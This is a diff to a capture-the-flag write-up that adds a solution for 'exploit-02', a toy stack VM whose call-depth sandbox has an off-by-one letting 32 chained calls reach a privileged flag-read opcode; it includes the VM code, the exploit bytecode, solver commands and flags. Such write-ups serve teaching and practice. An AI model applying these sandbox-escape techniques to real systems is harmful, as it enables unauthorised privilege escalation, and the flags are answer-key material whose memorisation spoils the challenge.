@@ -641,6 +641,98 @@ production.
 POCTF{127.1619.IQGHFCSX77GP7HGI.F2WPFJSWTWGWOP542XVYQODEE4}
 ```
 
+## exploit-02: Thirty-Two Steps Down
+
+**Solver:** `exploit-02-thirty-two-steps-down.py`
+**Service source:** `attachments/exploit-02/`
+
+### The setup
+
+The service runs a small stack VM. Bytecode is uploaded as text, one
+instruction per line, terminated by a single `.`. The interesting part is the
+call-depth sandbox:
+
+```python
+MAX_CALL_DEPTH = 32
+KERNEL_LEVEL = 33
+
+def op_CALL(self, operand):
+    if self.level >= self.MAX_CALL_DEPTH:
+        raise VMError("sandbox refused CALL ...")
+    self.call_stack.append(self.pc)
+    self.level += 1
+    self.pc = self.labels[operand]
+
+def op_READ_HOST_FLAG(self, operand):
+    if self.level < self.MAX_CALL_DEPTH:
+        raise VMError("READ_HOST_FLAG requires kernel level ...")
+    self._emit(self.flag)
+```
+
+The manual says level 33 is kernel and that user code cannot go past 32. It
+also says `READ_HOST_FLAG` requires kernel privilege.
+
+### The off-by-one
+
+The two checks use different boundaries:
+
+- `CALL` refuses when `level >= 32`, so user code can reach **level 32**.
+- `READ_HOST_FLAG` refuses when `level < 32`, so it accepts **level 32**.
+
+That means the deepest legal user level is already privileged. Nothing has to
+escape the sandbox; the sandbox simply trusts the ceiling.
+
+### The program
+
+Chain 32 `CALL`s and read the flag at the bottom:
+
+```text
+level1:
+    CALL level2
+level2:
+    CALL level3
+...
+level32:
+    CALL level33
+level33:
+    READ_HOST_FLAG
+    HALT
+.
+```
+
+The solver prints this so it can be pasted straight into `nc`:
+
+```console
+nix develop
+uv run competitions/p/pointeroverflowctf/2026-10/exploit-02-thirty-two-steps-down.py
+```
+
+Or run it against the local service:
+
+```console
+uv run competitions/p/pointeroverflowctf/2026-10/exploit-02-thirty-two-steps-down.py \
+  --run competitions/p/pointeroverflowctf/2026-10/attachments/exploit-02/service.py
+```
+
+Output:
+
+```text
+  ── Output ────────────────────────────────────────────────
+  POCTF{dev.flag.local.testing.only}
+  ──────────────────────────────────────────────────────────
+  steps executed: 34 | final level: 32 | data-stack size: 0
+```
+
+`final level: 32` is the whole bug. With `--depth 31` the same program fails
+with `READ_HOST_FLAG requires kernel level (>= 32); you are at level 31`,
+which confirms the boundary is exactly 32.
+
+### Flag
+
+```text
+POCTF{129.1619.ESI57MQ44XLDCSON.IG77KRAXOAFMNELCNTCBSFARJ7}
+```
+
 ## exploit-03: The Sandglass
 
 **Payload:** `exploit-03-the-sandglass.lua`
@@ -1368,5 +1460,6 @@ POCTF{131.1619.fca89aa3f4077934.J5WUR3D3BOHL6XBJLOUNLAFCGK}
 | `crypto-07` | The Notary's Seal | Textbook RSA, low exponent, integer cube root | `POCTF{75.1619.QYL3A7E63L6VBSHC.ZJFJ4JO7TKGSPUFMGUUOGJGRR5}` |
 | `crypto-08` | Forty Measures Deep | MIDI note cipher, musical alphabet | `POCTF{74.1619.57WBSCSK227RPRQB.WKBQSVVD5W5YN3Z25ININFJVDT}` |
 | `exploit-01` | Read Me My Fortune | `str.format` attribute walk via `__globals__` | `POCTF{127.1619.IQGHFCSX77GP7HGI.F2WPFJSWTWGWOP542XVYQODEE4}` |
+| `exploit-02` | Thirty-Two Steps Down | VM call-depth off-by-one reaches kernel flag opcode | per-team |
 | `exploit-03` | The Sandglass | Lua sandbox escape, arbitrary file read via `io.open` | `POCTF{128.1619.687dd42ffb219159.H4NH7DMPZGZUPGEWF3UQSSIWCJ}` |
 | `exploit-05` | What the Heap Remembers | Unchecked slab read leaks the in-memory XOR key, fixed method for generating key (MurmurHashV2 and LCG) | `POCTF{131.1619.fca89aa3f4077934.J5WUR3D3BOHL6XBJLOUNLAFCGK}` |
